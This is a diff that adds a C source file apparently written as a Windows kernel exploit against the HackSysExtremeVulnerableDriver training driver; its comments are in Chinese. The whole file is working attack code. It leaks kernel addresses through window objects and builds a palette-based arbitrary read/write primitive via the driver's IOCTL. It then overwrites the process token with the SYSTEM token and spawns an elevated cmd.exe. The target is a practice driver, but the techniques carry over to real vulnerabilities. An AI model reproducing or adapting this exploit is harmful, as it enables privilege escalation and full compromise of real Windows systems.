@@ -1,0 +1,216 @@
+#include <windows.h>
+#include <stdio.h>
+#include <Psapi.h>
+#include <profileapi.h>
+typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);
+lHMValidateHandle pHmValidateHandle = NULL;
+typedef struct _HEAD
+{
+	HANDLE h;
+	DWORD  cLockObj;
+} HEAD, *PHEAD;
+typedef struct _G_PALETTE
+{
+	HPALETTE _hpalette;
+	DWORD64 _kobj_palette;
+	DWORD flag;
+} GPALETTE, *PGPALETTE;
+typedef struct _THROBJHEAD
+{
+	HEAD h;
+	PVOID ethread;
+} THROBJHEAD, *PTHROBJHEAD;
+typedef struct _THRDESKHEAD
+{
+	THROBJHEAD h;
+	PVOID    rpdesk;//0x18 桌面堆地址范围
+	PVOID       pSelf;
+	//前面总大小为0x28 而TAGCLS位于0xa8
+	char buf[0x80];
+	PVOID TAGCLS;
+} THRDESKHEAD, *PTHRDESKHEAD;
+
+BOOL FindHMValidateHandle() {
+	HMODULE hUser32 = LoadLibraryA("user32.dll");
+	if (hUser32 == NULL) {
+		printf("Failed to load user32");
+		return FALSE;
+	}
+	//IsMenu用来确定句柄是否为菜单句柄
+	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
+	if (pIsMenu == NULL) {
+		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
+		return FALSE;
+	}
+	//由于HMValidateHandleOffset函数位于IsMenu中，IsMenu中特征码为e8也就是一个call就是HMValidateHandleOffset函数地址
+	unsigned int uiHMValidateHandleOffset = 0;
+	for (unsigned int i = 0; i < 0x1000; i++) {
+		BYTE* test = pIsMenu + i;
+		if (*test == 0xE8) {
+			uiHMValidateHandleOffset = i + 1;
+			break;
+		}
+	}
+	if (uiHMValidateHandleOffset == 0) {
+		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
+		return FALSE;
+	}
+
+	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
+	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
+	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
+	return TRUE;
+}
+PGPALETTE hManager;
+PGPALETTE hWorker;
+LRESULT CALLBACK MainWProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+	return DefWindowProc(hWnd, uMsg, wParam, lParam);
+}
+VOID findaddr(PGPALETTE temph) {
+	WNDCLASSEX wnd = { 0x0 };
+	wnd.cbWndExtra = 0x100;
+	wnd.cbSize = sizeof(wnd);
+	TCHAR temp[0x68];
+	memset(temp, 0x41, sizeof(temp));
+	wnd.lpszClassName = TEXT("MainWClass");
+	wnd.lpfnWndProc = MainWProc;
+	wnd.lpszMenuName = temp;
+	while (true)
+	{
+		RegisterClassEx(&wnd);
+		HWND hd1 = CreateWindowEx(0, wnd.lpszClassName, L"Manage", 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, 0, 0);
+		PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hd1, 1);
+		ULONG64 temp2 = (ULONG64)tagWND->pSelf - (ULONG64)tagWND;
+		DWORD64 KerneltagWND = (DWORD64)(tagWND->pSelf);
+		DWORD64 UsertagWND = (DWORD64)tagWND;
+		DWORD64 ulClientDelta = KerneltagWND - UsertagWND;
+		DWORD64 KerneltagCLS = *(PDWORD64)(UsertagWND + 0xa8);
+		DWORD64 lpszMenuNameA = *(PDWORD64)(KerneltagCLS - ulClientDelta + 0x98);
+		DestroyWindow(hd1);
+		UnregisterClass(wnd.lpszClassName, NULL);
+		RegisterClassEx(&wnd);
+		hd1 = CreateWindowEx(0, wnd.lpszClassName, L"Worker", 0, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, 0, 0);
+		tagWND = (PTHRDESKHEAD)pHmValidateHandle(hd1, 1);
+		KerneltagWND = (DWORD64)(tagWND->pSelf);
+		UsertagWND = (DWORD64)tagWND;
+		ulClientDelta = KerneltagWND - UsertagWND;
+		KerneltagCLS = *(PDWORD64)(UsertagWND + 0xa8);
+		DWORD64 lpszMenuNameB = *(PDWORD64)(KerneltagCLS - ulClientDelta + 0x98);
+		if (lpszMenuNameB == lpszMenuNameA)
+		{
+			DestroyWindow(hd1);
+			UnregisterClass(wnd.lpszClassName, NULL);
+			int pal_cnt = (0xe0 - 0x90) / 4;
+			int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
+			LOGPALETTE *lPalette = (LOGPALETTE*)malloc(palsize);
+			memset(lPalette, 0x4, palsize);
+			lPalette->palNumEntries = (0xe0 - 0x90) / 4;
+			lPalette->palVersion = 0x300;
+			temph->_hpalette = CreatePalette(lPalette);
+			printf("temph->_hpalette=%x\n", temph->_hpalette);
+			temph->_kobj_palette = lpszMenuNameA;
+			temph->flag = 1;
+			return;
+		}
+		DestroyWindow(hd1);
+		UnregisterClass(wnd.lpszClassName, NULL);
+	}
+}
+LONG ReadMemory(HPALETTE  hManager, HPALETTE  hWorker, PVOID src, PVOID dest, DWORD len) {
+	if (SetPaletteEntries(hManager, 0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)&src) == 0) {
+		printf("[-] Unable To Set Source Address: 0x%p\n", src);
+		return FALSE;
+	}
+	return GetPaletteEntries(hWorker, 0, len / sizeof(PALETTEENTRY), (PALETTEENTRY*)dest) ? TRUE : FALSE;
+}
+LONG WriteMemory(HPALETTE  hManager, HPALETTE  hWorker, UINT64 src, PVOID dest, DWORD len) {
+
+	if (SetPaletteEntries(hManager, 0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)&src) == 0) {
+		printf("[-] Unable To Set Source Address: 0x%p\n", src);
+		return FALSE;
+	}
+	return SetPaletteEntries(hWorker, 0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)dest) ? TRUE : FALSE;
+}
+
+int main()
+{
+	BOOL bFound = FindHMValidateHandle();
+	printf("HmValidateHandle=%llX\n", pHmValidateHandle);
+	if (!bFound) {
+		printf("Failed to locate HmValidateHandle, exiting\n");
+		return 1;
+	}
+	GPALETTE hManager;
+	GPALETTE hWorker;
+	findaddr(&hManager);
+	findaddr(&hWorker);
+	printf("Manager Palette HPALETTE: 0x%p, Kernel Address: 0x%llx\n", hManager._hpalette, hManager._kobj_palette);
+	printf("Worker Palette HPALETTE: 0x%p, Kernel Address: 0x%llx\n", hWorker._hpalette, hWorker._kobj_palette);
+	//原来的地址保存起来
+
+	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf("[!] Unable to get a handle on the device\n"); return(-1); }
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[!] Unable to get a handle on the device\n");
+		getchar();
+		return(-1);
+	}
+	DWORD64 buf[2];
+	//+0x68 cbClsExtra 
+	buf[1] = (ULONG64)(hManager._kobj_palette + 0x78);
+	ULONG64 tempco= (ULONG64)(hWorker._kobj_palette + 0x78);
+	buf[0] = (ULONG64)&tempco;
+	printf("Worker->_hpalette=%llX\n", *(ULONG64*)*buf);
+	LPDWORD dwBytesOut{};
+	//修改变量
+	DeviceIoControl(hDriver, 0x22200b, buf, 0x10, 0, 0, dwBytesOut, NULL);
+
+	LPVOID lpImageBase[1024];
+	DWORD lpcbNeeded;
+	TCHAR lpfileName[1024];
+	PVOID64 UserBase;
+	HMODULE nbase;
+	ULONG64 address;
+	ULONG64 PsInitialSystemProcess;
+	//遍历模块
+	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
+	//获取第一个模块地址
+	GetDeviceDriverBaseName(lpImageBase[0], lpfileName, 48);
+	UserBase = lpImageBase[0];
+	nbase = LoadLibrary(L"ntoskrnl.exe");
+	printf("UserBase=%llX\n", UserBase);
+	address = (ULONG64)GetProcAddress(nbase, "PsInitialSystemProcess");
+	//PsInitialSystemProcess 是一个指向system EPROCESS的指针
+	PsInitialSystemProcess = ((ULONG64)address - (ULONG64)nbase + (ULONG64)UserBase);
+	printf("PsInitialSystemProcess=%llX\n", PsInitialSystemProcess);
+
+	LIST_ENTRY ActiveProcessLinks{};
+	DWORD64 currentProcess;//当前进程eporcess
+	ULONG64 UniqueProcessId;
+	ULONG64 SystemProcess{};
+
+	ReadMemory(hManager._hpalette, hWorker._hpalette, (PVOID)PsInitialSystemProcess,
+		&SystemProcess, sizeof(LPVOID));
+	printf("SystemEProcess=%llX\n", SystemProcess);
+	DWORD dwCurrentPID;
+	//+0x2e8 ActiveProcessLinks : _LIST_ENTRY
+	ReadMemory(hManager._hpalette, hWorker._hpalette, (PVOID)(SystemProcess + 0x2e8), &ActiveProcessLinks, sizeof(LIST_ENTRY));
+	do
+	{
+		currentProcess = (DWORD64)((PUCHAR)ActiveProcessLinks.Flink - 0x2e8);
+		ReadMemory(hManager._hpalette, hWorker._hpalette, (PVOID)(currentProcess + 0x2e0), &UniqueProcessId, sizeof(LPVOID));
+		dwCurrentPID = LOWORD(UniqueProcessId);
+		ReadMemory(hManager._hpalette, hWorker._hpalette, (PVOID)(currentProcess + 0x2e8), &ActiveProcessLinks, sizeof(LIST_ENTRY));
+	} while (dwCurrentPID != GetCurrentProcessId());
+	ULONG64 systemtoken{};
+	//+0x358 Token            : _EX_FAST_REF
+	printf("eProcessToken=%llX\n", currentProcess + 0x358);
+	ReadMemory(hManager._hpalette, hWorker._hpalette, (PVOID)(SystemProcess + 0x358),
+		&systemtoken, sizeof(LPVOID));
+	printf("systemtoken=%llX\n", systemtoken);
+	WriteMemory(hManager._hpalette, hWorker._hpalette, currentProcess + 0x358,
+		(PVOID)&systemtoken, sizeof(LPVOID));
+	system("cmd.exe");
+	getchar();
+	return 0;
+}
